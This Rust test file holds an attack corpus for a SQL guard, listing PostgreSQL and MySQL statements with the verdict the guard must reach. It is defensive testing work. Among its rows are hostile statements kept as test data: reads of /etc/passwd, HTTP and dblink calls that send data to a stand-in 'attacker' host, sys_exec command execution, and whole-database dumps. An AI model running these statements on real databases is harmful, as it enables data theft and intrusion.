//! Data-driven attack corpus for the SQL guard.
//!
//! Every row is one statement, the dialect and access level it is analyzed
//! with, the blocked-table patterns in force, the outcome the guard must
//! reach, and a short note. Rows marked "must allow" guard against
//! over-blocking. Add a row for every new bypass before fixing it.
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing
)]

use vda_guard::{analyze, AccessLevel, Analysis, Dialect, GuardPolicy, StatementKind, Verdict};

const PG: Dialect = Dialect::Postgres;
const MY: Dialect = Dialect::MySql;
const ADMIN: AccessLevel = AccessLevel::Admin;
const READ: AccessLevel = AccessLevel::Read;

const NONE: &[&str] = &[];
const PUBLIC_USERS: &[&str] = &["public.users"];
const CATALOG_USERS: &[&str] = &["mydb.public.users"];
const PUBLIC_ALL: &[&str] = &["public.*"];
const ANY_USERS: &[&str] = &["*.users"];
const PUBLIC_USER_GLOB: &[&str] = &["public.user*"];
const SHOP_USERS: &[&str] = &["shop.users"];

/// The outcome a corpus row requires.
#[derive(Debug, Clone, Copy)]
enum Expect {
    /// Denied, with this issue code among the issues.
    Deny(&'static str),
    /// Needs approval, effective kind, and this issue code among the issues.
    Approval(StatementKind, &'static str),
    /// Allowed, effective kind, and exactly these recorded relations.
    Allow(StatementKind, &'static [&'static str]),
    /// Allowed, effective kind, with this (non-blocking) issue code.
    Warn(StatementKind, &'static str),
}

use Expect::{Allow, Approval, Deny, Warn};
use StatementKind::{Delete, Explain, Select, Update};

type Case = (
    Dialect,
    AccessLevel,
    &'static [&'static str],
    &'static str,
    Expect,
    &'static str,
);

#[rustfmt::skip]
const CASES: &[Case] = &[
    // ---------------------------------------------------------------- Hole 1
    // PostgreSQL functions that run SQL passed as text.
    (PG, ADMIN, NONE, "SELECT ts_stat('SELECT body FROM secrets')", Deny("dangerous_function"), "ts_stat runs its text argument as SQL"),
    (PG, ADMIN, NONE, "SELECT * FROM ts_stat('SELECT body FROM secrets')", Deny("dangerous_function"), "ts_stat as a table function"),
    (PG, ADMIN, NONE, "SELECT * FROM pg_catalog.ts_stat('SELECT 1')", Deny("dangerous_function"), "schema-qualified ts_stat"),
    (PG, ADMIN, NONE, "SELECT \"ts_stat\"('SELECT 1')", Deny("dangerous_function"), "quoted ts_stat"),
    (PG, ADMIN, NONE, "SELECT pg_catalog.\"ts_stat\"('SELECT 1')", Deny("dangerous_function"), "qualified and quoted ts_stat"),
    (PG, ADMIN, NONE, "SELECT TS_STAT('SELECT 1')", Deny("dangerous_function"), "upper-case ts_stat"),
    (PG, ADMIN, NONE, "SELECT Ts_Stat /* c */ ( 'SELECT 1' )", Deny("dangerous_function"), "mixed case, comment and whitespace"),
    (PG, ADMIN, NONE, "SELECT * FROM LATERAL ts_stat('SELECT 1')", Deny("dangerous_function"), "LATERAL ts_stat"),
    (PG, ADMIN, NONE, "SELECT id FROM t WHERE EXISTS (SELECT 1 FROM ts_stat('SELECT 1'))", Deny("dangerous_function"), "ts_stat inside a subquery"),
    (PG, ADMIN, NONE, "UPDATE t SET a = (SELECT count(*) FROM ts_stat('SELECT 1')) WHERE id = 1", Deny("dangerous_function"), "ts_stat inside a write"),
    (PG, ADMIN, NONE, "SELECT ts_rewrite('a & b'::tsquery, 'SELECT t, s FROM aliases')", Deny("dangerous_function"), "ts_rewrite runs its text argument as SQL"),
    (PG, ADMIN, NONE, "SELECT pg_catalog.TS_REWRITE('a'::tsquery, 'SELECT 1')", Deny("dangerous_function"), "qualified upper-case ts_rewrite"),
    (PG, ADMIN, NONE, "SELECT * FROM crosstab('SELECT row_name, cat, value FROM secrets')", Deny("dangerous_function"), "tablefunc crosstab runs SQL text"),
    (PG, ADMIN, NONE, "SELECT * FROM connectby('secrets', 'id', 'parent', '1', 0) AS t(id text, parent text, level int)", Deny("dangerous_function"), "tablefunc connectby reads a table named in text"),
    (PG, ADMIN, NONE, "SELECT xpath_table('id', 'doc', 'secrets', '/a', 'true')", Deny("dangerous_function"), "xml2 xpath_table reads a table named in text"),
    (PG, ADMIN, NONE, "SELECT pg_background_launch('DELETE FROM t')", Deny("dangerous_function"), "pg_background runs SQL text"),
    (PG, ADMIN, NONE, "SELECT cron.schedule('* * * * *', 'DELETE FROM t')", Deny("dangerous_function"), "pg_cron schedules SQL text"),
    (PG, ADMIN, NONE, "SELECT schedule_in_database('j', '* * * * *', 'DELETE FROM t', 'db')", Deny("dangerous_function"), "unqualified pg_cron"),
    (PG, ADMIN, NONE, "SELECT aws_s3.query_export_to_s3('SELECT * FROM secrets', NULL)", Deny("dangerous_function"), "RDS export runs SQL text and sends it off-server"),
    // Whole-table, schema and database dumps that bypass blocked tables.
    (PG, ADMIN, NONE, "SELECT table_to_xml('users', true, false, '')", Deny("dangerous_function"), "table dump"),
    (PG, ADMIN, NONE, "SELECT table_to_xml_and_xmlschema('users', true, false, '')", Deny("dangerous_function"), "table dump with schema"),
    (PG, ADMIN, NONE, "SELECT table_to_xmlschema('users', true, false, '')", Deny("dangerous_function"), "table schema"),
    (PG, ADMIN, NONE, "SELECT schema_to_xml('public', true, false, '')", Deny("dangerous_function"), "schema dump"),
    (PG, ADMIN, NONE, "SELECT schema_to_xmlschema('public', true, false, '')", Deny("dangerous_function"), "schema dump schema"),
    (PG, ADMIN, NONE, "SELECT schema_to_xml_and_xmlschema('public', true, false, '')", Deny("dangerous_function"), "schema dump with schema"),
    (PG, ADMIN, NONE, "SELECT database_to_xml(true, false, '')", Deny("dangerous_function"), "database dump"),
    (PG, ADMIN, NONE, "SELECT database_to_xmlschema(true, false, '')", Deny("dangerous_function"), "database dump schema"),
    (PG, ADMIN, NONE, "SELECT database_to_xml_and_xmlschema(true, false, '')", Deny("dangerous_function"), "database dump with schema"),
    (PG, ADMIN, NONE, "SELECT query_to_xmlschema('SELECT * FROM secrets', true, false, '')", Deny("dangerous_function"), "query_to_xmlschema runs SQL text"),
    (PG, ADMIN, NONE, "SELECT query_to_xml_and_xmlschema('SELECT * FROM secrets', true, false, '')", Deny("dangerous_function"), "query_to_xml_and_xmlschema runs SQL text"),
    (PG, ADMIN, NONE, "SELECT cursor_to_xml('c', 10, true, false, '')", Deny("dangerous_function"), "cursor dump"),
    (PG, ADMIN, NONE, "SELECT cursor_to_xmlschema('c', true, false, '')", Deny("dangerous_function"), "cursor schema"),
    (PG, ADMIN, NONE, "SELECT PG_CATALOG.\"table_to_xml\"('users', true, false, '')", Deny("dangerous_function"), "qualified quoted table dump"),
    (PG, ADMIN, NONE, "SELECT get_raw_page('users', 0)", Deny("dangerous_function"), "pageinspect reads raw table pages"),
    (PG, ADMIN, NONE, "SELECT * FROM pg_logical_slot_peek_changes('s', NULL, NULL)", Deny("dangerous_function"), "logical decoding reads every table's changes"),
    (PG, ADMIN, NONE, "SELECT * FROM pg_get_wal_records_info('0/0', '0/1')", Deny("dangerous_function"), "pg_walinspect reads WAL"),
    (PG, ADMIN, NONE, "SELECT lo_get(16400)", Deny("dangerous_function"), "large objects are outside table policy"),
    // Session-level and transaction-level advisory locks.
    (PG, ADMIN, NONE, "SELECT pg_try_advisory_lock_shared(1)", Deny("dangerous_function"), "advisory lock"),
    (PG, ADMIN, NONE, "SELECT pg_advisory_xact_lock_shared(1)", Deny("dangerous_function"), "advisory lock"),
    (PG, ADMIN, NONE, "SELECT pg_try_advisory_xact_lock(1)", Deny("dangerous_function"), "advisory lock"),
    (PG, ADMIN, NONE, "SELECT pg_try_advisory_xact_lock_shared(1, 2)", Deny("dangerous_function"), "advisory lock"),
    (PG, ADMIN, NONE, "SELECT pg_catalog.PG_ADVISORY_LOCK(1)", Deny("dangerous_function"), "qualified upper-case advisory lock"),
    (PG, ADMIN, NONE, "SELECT pg_advisory_unlock_all()", Deny("dangerous_function"), "advisory unlock"),
    // dblink and other network access.
    (PG, ADMIN, NONE, "SELECT dblink_connect_u('c', 'host=attacker')", Deny("dangerous_function"), "dblink without password checks"),
    (PG, ADMIN, NONE, "SELECT dblink_open('c', 'SELECT * FROM secrets')", Deny("dangerous_function"), "dblink cursor"),
    (PG, ADMIN, NONE, "SELECT * FROM dblink_fetch('c', 10) AS t(a int)", Deny("dangerous_function"), "dblink fetch"),
    (PG, ADMIN, NONE, "SELECT * FROM dblink_get_result('c') AS t(a int)", Deny("dangerous_function"), "dblink async result"),
    (PG, ADMIN, NONE, "SELECT dblink_disconnect()", Deny("dangerous_function"), "dblink family"),
    (PG, ADMIN, NONE, "SELECT public.\"dblink\"('host=x', 'SELECT 1')", Deny("dangerous_function"), "qualified quoted dblink"),
    (PG, ADMIN, NONE, "SELECT http_get('http://attacker/?' || current_user)", Deny("dangerous_function"), "pgsql-http"),
    (PG, ADMIN, NONE, "SELECT net.http_post('http://attacker', '{}'::jsonb)", Deny("dangerous_function"), "pg_net"),
    // Files, server state and backends.
    (PG, ADMIN, NONE, "SELECT pg_catalog.pg_read_file('/etc/passwd')", Deny("dangerous_function"), "server file read"),
    (PG, ADMIN, NONE, "SELECT * FROM pg_ls_logicalsnapdir()", Deny("dangerous_function"), "server directory listing"),
    (PG, ADMIN, NONE, "SELECT pg_catalog.set_config('role', 'postgres', false)", Deny("dangerous_function"), "session role change"),
    (PG, ADMIN, NONE, "SELECT pg_stat_reset()", Deny("dangerous_function"), "statistics reset"),
    (PG, ADMIN, NONE, "SELECT pg_stat_statements_reset()", Deny("dangerous_function"), "statistics reset"),
    (PG, ADMIN, NONE, "SELECT pg_replication_origin_create('x')", Deny("dangerous_function"), "replication state"),
    (PG, ADMIN, NONE, "SELECT pg_log_backend_memory_contexts(1)", Deny("dangerous_function"), "backend signalling"),
    (PG, ADMIN, NONE, "SELECT pg_terminate_backend(1)", Deny("dangerous_function"), "terminate backend"),
    (PG, ADMIN, NONE, "SELECT pg_sleep(10)", Deny("dangerous_function"), "sleep"),
    // MySQL / MariaDB.
    (MY, ADMIN, NONE, "SELECT SLEEP(5)", Deny("dangerous_function"), "sleep"),
    (MY, ADMIN, NONE, "SELECT id FROM t WHERE id = (SELECT `sleep`(5))", Deny("dangerous_function"), "quoted nested sleep"),
    (MY, ADMIN, NONE, "SELECT BENCHMARK(100000000, MD5('x'))", Deny("dangerous_function"), "benchmark"),
    (MY, ADMIN, NONE, "SELECT LOAD_FILE('/etc/passwd')", Deny("dangerous_function"), "server file read"),
    (MY, ADMIN, NONE, "SELECT GET_LOCK('a', 10)", Deny("dangerous_function"), "user lock"),
    (MY, ADMIN, NONE, "SELECT IS_FREE_LOCK('a')", Deny("dangerous_function"), "user lock family"),
    (MY, ADMIN, NONE, "SELECT IS_USED_LOCK('a')", Deny("dangerous_function"), "user lock family"),
    (MY, ADMIN, NONE, "SELECT RELEASE_ALL_LOCKS()", Deny("dangerous_function"), "user lock family"),
    (MY, ADMIN, NONE, "SELECT service_get_write_locks('ns', 'l', 10)", Deny("dangerous_function"), "locking service"),
    (MY, ADMIN, NONE, "SELECT MASTER_GTID_WAIT('0-1-100', 60)", Deny("dangerous_function"), "MariaDB replication wait"),
    (MY, ADMIN, NONE, "SELECT WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS('x', 60)", Deny("dangerous_function"), "replication wait"),
    (MY, ADMIN, NONE, "SELECT sys_exec('id')", Deny("dangerous_function"), "lib_mysqludf_sys"),
    (MY, ADMIN, NONE, "SELECT sys_set('PATH', '/tmp')", Deny("dangerous_function"), "lib_mysqludf_sys"),
    (MY, ADMIN, NONE, "SELECT sys.ps_setup_disable_thread(1)", Deny("dangerous_function"), "sys schema routine"),
    (MY, ADMIN, NONE, "SELECT spider_direct_sql('SELECT 1', 't', 'srv \"x\"')", Deny("dangerous_function"), "Spider runs SQL on a remote server"),
    (MY, ADMIN, NONE, "SELECT keyring_key_fetch('k')", Deny("dangerous_function"), "keyring secret read"),
    (MY, ADMIN, NONE, "SELECT version_tokens_set('a=1')", Deny("dangerous_function"), "server state"),
    (MY, ADMIN, NONE, "SELECT mysql.sleep(1)", Deny("dangerous_function"), "qualified sleep"),
    // Must allow: names that only look like dangerous functions.
    (PG, ADMIN, NONE, "SELECT ts_stat FROM t", Allow(Select, &["t"]), "must allow: column named ts_stat"),
    (PG, ADMIN, NONE, "SELECT t.ts_stat, t.dblink, t.sleep FROM t", Allow(Select, &["t"]), "must allow: columns named like functions"),
    (PG, ADMIN, NONE, "SELECT id FROM ts_stats", Allow(Select, &["ts_stats"]), "must allow: table named like a function"),
    (PG, ADMIN, NONE, "SELECT id FROM dblink_audit", Allow(Select, &["dblink_audit"]), "must allow: table named with a blocked prefix"),
    (PG, ADMIN, NONE, "SELECT count(*) FROM users", Allow(Select, &["users"]), "must allow: aggregate"),
    (PG, ADMIN, NONE, "SELECT to_tsvector('english', body) FROM docs", Allow(Select, &["docs"]), "must allow: text search builtin"),
    (MY, ADMIN, NONE, "SELECT sleep_minutes FROM shifts", Allow(Select, &["shifts"]), "must allow: column named like sleep"),
    (MY, ADMIN, NONE, "SELECT id FROM users", Allow(Select, &["users"]), "must allow: plain read"),

    // ---------------------------------------------------------------- Hole 2
    // PostgreSQL ONLY must record the real relation, not a table named "only".
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY users", Deny("blocked_table"), "ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "select * from only users", Deny("blocked_table"), "lower-case ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM /* a */ ONLY /* b */ users", Deny("blocked_table"), "ONLY with comments"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM\n\tONLY\n\tusers\n", Deny("blocked_table"), "ONLY with whitespace"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY \"users\"", Deny("blocked_table"), "ONLY with a quoted relation"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY (users)", Deny("blocked_table"), "parenthesized ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY(users) u", Deny("blocked_table"), "parenthesized ONLY with alias"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY (public.users)", Deny("blocked_table"), "parenthesized qualified ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM orders o JOIN ONLY users ON true", Deny("blocked_table"), "ONLY in a join"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY users, orders", Deny("blocked_table"), "ONLY in a from list"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM orders WHERE uid IN (SELECT id FROM ONLY users)", Deny("blocked_table"), "ONLY in a subquery"),
    (PG, ADMIN, PUBLIC_USERS, "WITH users AS (SELECT 1) SELECT * FROM ONLY users", Deny("blocked_table"), "ONLY never resolves to a CTE here (fail closed)"),
    (PG, ADMIN, PUBLIC_USERS, "UPDATE ONLY users SET a = 1 WHERE id = 1", Deny("blocked_table"), "UPDATE ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "DELETE FROM ONLY users WHERE id = 1", Deny("blocked_table"), "DELETE FROM ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "DELETE FROM x USING ONLY users WHERE x.id = users.id", Deny("blocked_table"), "DELETE USING ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "UPDATE x SET a = 1 FROM ONLY users WHERE x.id = users.id", Deny("blocked_table"), "UPDATE FROM ONLY"),
    (PG, ADMIN, PUBLIC_USERS, "MERGE INTO ONLY users USING y ON users.id = y.id WHEN MATCHED THEN DELETE", Deny("blocked_table"), "MERGE INTO ONLY"),
    (PG, ADMIN, NONE, "SELECT * FROM ONLY users", Allow(Select, &["users"]), "ONLY records the real relation for masking"),
    (PG, ADMIN, NONE, "SELECT * FROM ONLY (public.users) u", Allow(Select, &["public.users"]), "parenthesized ONLY records the real relation"),
    (PG, ADMIN, NONE, "SELECT * FROM only", Deny("unsupported_syntax"), "bare ONLY is not a relation"),
    // Forms sqlparser cannot parse are denied (fail closed).
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY public.users u", Deny("parse_error"), "qualified ONLY with alias"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY users AS u", Deny("parse_error"), "ONLY with AS alias"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM users *", Deny("parse_error"), "inheritance star"),
    (PG, ADMIN, PUBLIC_USERS, "TABLE users", Deny("parse_error"), "TABLE command"),
    (PG, ADMIN, PUBLIC_USERS, "TABLE ONLY users", Deny("parse_error"), "TABLE ONLY command"),
    // Must allow.
    (PG, ADMIN, NONE, "SELECT * FROM \"only\"", Allow(Select, &["only"]), "must allow: quoted table really named only"),
    (MY, ADMIN, NONE, "SELECT * FROM only u", Allow(Select, &["only"]), "must allow: ONLY is not reserved in MySQL"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM ONLY orders", Allow(Select, &["orders"]), "must allow: ONLY on an unblocked table"),

    // ---------------------------------------------------------------- Hole 3
    // An unqualified relation can resolve to any schema through search_path.
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM users", Deny("blocked_table"), "unqualified relation vs qualified pattern"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM USERS", Deny("blocked_table"), "upper-case relation"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM \"users\"", Deny("blocked_table"), "quoted relation"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM public.users", Deny("blocked_table"), "qualified relation"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM \"public\".\"users\"", Deny("blocked_table"), "quoted qualified relation"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM mydb.public.users", Deny("blocked_table"), "three-part relation"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT * FROM orders WHERE uid IN (SELECT id FROM users)", Deny("blocked_table"), "unqualified in a subquery"),
    (PG, ADMIN, PUBLIC_USERS, "UPDATE users SET a = 1 WHERE id = 1", Deny("blocked_table"), "unqualified write target"),
    (PG, ADMIN, PUBLIC_USERS, "DELETE FROM users WHERE id = 1", Deny("blocked_table"), "unqualified delete target"),
    (PG, ADMIN, PUBLIC_USERS, "INSERT INTO users VALUES (1)", Deny("blocked_table"), "unqualified insert target"),
    (PG, ADMIN, PUBLIC_USERS, "EXPLAIN SELECT * FROM users", Deny("blocked_table"), "plan of a blocked relation"),
    (PG, ADMIN, CATALOG_USERS, "SELECT id FROM users", Deny("blocked_table"), "three-part pattern, unqualified relation"),
    (PG, ADMIN, CATALOG_USERS, "SELECT id FROM public.users", Deny("blocked_table"), "three-part pattern, qualified relation"),
    (PG, ADMIN, CATALOG_USERS, "SELECT id FROM mydb.public.users", Deny("blocked_table"), "three-part pattern, three-part relation"),
    (PG, ADMIN, PUBLIC_ALL, "SELECT id FROM users", Deny("blocked_table"), "schema glob, unqualified relation (fail closed)"),
    (PG, ADMIN, ANY_USERS, "SELECT id FROM users", Deny("blocked_table"), "any-schema pattern"),
    (PG, ADMIN, PUBLIC_USER_GLOB, "SELECT id FROM users_archive", Deny("blocked_table"), "table glob, unqualified relation"),
    (MY, ADMIN, SHOP_USERS, "SELECT id FROM users", Deny("blocked_table"), "MySQL current database"),
    (MY, ADMIN, SHOP_USERS, "SELECT id FROM `users`", Deny("blocked_table"), "MySQL quoted"),
    (MY, ADMIN, SHOP_USERS, "SELECT id FROM SHOP.USERS", Deny("blocked_table"), "MySQL qualified"),
    // Must allow.
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM other.users", Allow(Select, &["other.users"]), "must allow: another schema"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM orders", Allow(Select, &["orders"]), "must allow: another table"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM users_archive", Allow(Select, &["users_archive"]), "must allow: similar name"),
    (PG, ADMIN, PUBLIC_USERS, "SELECT id FROM public.orders", Allow(Select, &["public.orders"]), "must allow: same schema, other table"),
    (PG, ADMIN, PUBLIC_USERS, "WITH users AS (SELECT 1 AS id) SELECT id FROM users", Allow(Select, NONE), "must allow: CTE named like a blocked table"),
    (PG, ADMIN, CATALOG_USERS, "SELECT id FROM other.users", Allow(Select, &["other.users"]), "must allow: three-part pattern, other schema"),
    (PG, ADMIN, PUBLIC_ALL, "SELECT id FROM other.users", Allow(Select, &["other.users"]), "must allow: schema glob, other schema"),
    (PG, ADMIN, PUBLIC_USER_GLOB, "SELECT id FROM orders", Allow(Select, &["orders"]), "must allow: table glob miss"),
    (MY, ADMIN, SHOP_USERS, "SELECT id FROM other.users", Allow(Select, &["other.users"]), "must allow: MySQL other database"),

    // ---------------------------------------------------------------- Hole 4
    // ANALYSE is a PostgreSQL synonym for ANALYZE; both execute the statement.
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYSE option"),
    (PG, ADMIN, NONE, "EXPLAIN (analyse) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "lower-case ANALYSE option"),
    (PG, ADMIN, NONE, "EXPLAIN (AnAlYsE) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "mixed-case ANALYSE option"),
    (PG, ADMIN, NONE, "EXPLAIN (VERBOSE, ANALYSE) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYSE after another option"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE, VERBOSE) UPDATE x SET a = 1 WHERE id = 1", Approval(Update, "explain_analyze_write"), "ANALYSE before another option"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE true) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYSE true"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE on) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYSE on"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE true) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYZE true"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE on) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYZE on"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE 1) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYZE 1"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE 'on') DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYZE 'on'"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE off) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYZE off is treated as executing (fail closed)"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE 0) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "ANALYZE 0 is treated as executing (fail closed)"),
    (PG, ADMIN, NONE, "EXPLAIN (\"analyze\") DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "quoted option name"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE false, ANALYSE) DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "any executing option wins"),
    (PG, ADMIN, NONE, "EXPLAIN ANALYSE DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "bare ANALYSE"),
    (PG, ADMIN, NONE, "explain analyse delete from x where id = 1", Approval(Delete, "explain_analyze_write"), "lower-case bare ANALYSE"),
    (PG, ADMIN, NONE, "EXPLAIN /* c */ ANALYSE\n DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "bare ANALYSE with a comment"),
    (PG, ADMIN, NONE, "EXPLAIN ANALYSE VERBOSE DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "bare ANALYSE VERBOSE"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE) DELETE FROM x", Deny("write_without_where"), "ANALYSE runs the unfiltered delete"),
    (PG, READ, NONE, "EXPLAIN (ANALYSE) DELETE FROM x WHERE id = 1", Deny("insufficient_access"), "ANALYSE needs write access"),
    (PG, READ, NONE, "EXPLAIN ANALYSE DELETE FROM x WHERE id = 1", Deny("insufficient_access"), "bare ANALYSE needs write access"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE) SELECT * FROM x", Warn(Explain, "explain_analyze_executes"), "ANALYSE of a read still warns"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE) SELECT ts_stat('SELECT 1')", Deny("dangerous_function"), "ANALYSE runs a dangerous function"),
    (MY, ADMIN, NONE, "DESCRIBE ANALYZE DELETE FROM x WHERE id = 1", Approval(Delete, "explain_analyze_write"), "MySQL DESCRIBE ANALYZE"),
    (MY, ADMIN, NONE, "EXPLAIN ANALYSE SELECT 1", Deny("parse_error"), "MySQL has no ANALYSE spelling"),
    // Must allow.
    (PG, ADMIN, NONE, "EXPLAIN SELECT 1", Allow(Explain, NONE), "must allow: plain EXPLAIN"),
    (PG, ADMIN, NONE, "EXPLAIN (VERBOSE, COSTS false) DELETE FROM x WHERE id = 1", Allow(Explain, &["x"]), "must allow: plan-only options"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYZE false) DELETE FROM x WHERE id = 1", Allow(Explain, &["x"]), "deliberate: literal false does not execute"),
    (PG, ADMIN, NONE, "EXPLAIN (ANALYSE false) DELETE FROM x WHERE id = 1", Allow(Explain, &["x"]), "deliberate: literal false does not execute"),
    (MY, ADMIN, NONE, "EXPLAIN SELECT id FROM users", Allow(Explain, &["users"]), "must allow: MySQL plain EXPLAIN"),
];

fn policy(blocked: &[&str]) -> GuardPolicy {
    GuardPolicy {
        max_rows: 100,
        allow_writes: true,
        require_approval_for_writes: true,
        allow_ddl: true,
        blocked_tables: blocked.iter().map(|s| (*s).to_owned()).collect(),
    }
}

fn has(a: &Analysis, code: &str) -> bool {
    a.issues.iter().any(|i| i.code == code)
}

fn kind(a: &Analysis) -> Option<StatementKind> {
    a.statements.first().map(|s| s.kind)
}

fn tables(a: &Analysis) -> Vec<String> {
    a.statements
        .iter()
        .flat_map(|s| s.tables.iter().cloned())
        .collect()
}

fn failure(case: &Case, a: &Analysis) -> Option<String> {
    let (_, _, _, _, expect, _) = *case;
    let ok = match expect {
        Deny(code) => a.verdict == Verdict::Deny && has(a, code),
        Approval(k, code) => {
            a.verdict == Verdict::RequiresApproval && kind(a) == Some(k) && has(a, code)
        }
        Allow(k, expected) => {
            a.verdict == Verdict::Allow && kind(a) == Some(k) && tables(a) == expected
        }
        Warn(k, code) => a.verdict == Verdict::Allow && kind(a) == Some(k) && has(a, code),
    };
    (!ok).then(|| {
        let (dialect, level, blocked, sql, expect, note) = *case;
        format!(
            "[{note}] {dialect:?}/{level:?} blocked={blocked:?}\n  sql: {sql}\n  expected: {expect:?}\n  got: verdict={:?} kind={:?} tables={:?} issues={:?}",
            a.verdict,
            kind(a),
            tables(a),
            a.issues.iter().map(|i| i.code.as_str()).collect::<Vec<_>>()
        )
    })
}

#[test]
fn attack_corpus() {
    let failures: Vec<String> = CASES
        .iter()
        .filter_map(|case| {
            let (dialect, level, blocked, sql, _, _) = *case;
            failure(case, &analyze(sql, dialect, level, &policy(blocked)))
        })
        .collect();
    assert!(
        failures.is_empty(),
        "{} of {} corpus cases failed:\n\n{}",
        failures.len(),
        CASES.len(),
        failures.join("\n\n")
    );
}

#[test]
fn only_keeps_its_meaning_in_executed_sql() {
    for sql in [
        "SELECT * FROM ONLY users",
        "SELECT * FROM ONLY (users) u",
        "SELECT * FROM a JOIN ONLY users ON true",
    ] {
        let a = analyze(sql, PG, ADMIN, &policy(NONE));
        let rewritten = a.rewritten_sql.expect(sql);
        assert!(
            rewritten.to_uppercase().contains("ONLY"),
            "{sql}: {rewritten}"
        );
        assert!(!rewritten.contains("\"only\""), "{sql}: {rewritten}");
    }
}
